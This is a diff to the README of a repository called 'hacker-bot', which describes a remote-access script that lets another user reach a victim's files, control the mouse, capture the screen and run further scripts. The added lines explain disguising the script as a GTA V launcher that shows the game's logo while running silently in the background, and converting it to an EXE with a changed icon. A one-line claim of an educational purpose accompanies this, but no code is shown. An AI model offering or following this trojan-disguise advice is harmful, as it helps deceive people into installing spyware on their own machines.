@@ -1,6 +1,14 @@
 # hacker-bot
 this script allow to any user to acces your files, controle your mouse, take pictures from your screen, run other script and even change it self.
 
+by clicking on the bat file it will show the GTA V logo and run the script silently in the background.
+
+you can convert this gta v.BAT to an EXE file and change its shortcut's icon.
+
+the goal of this repository is to education and protection!.
+
+
+
 # menu
 
 *******************************
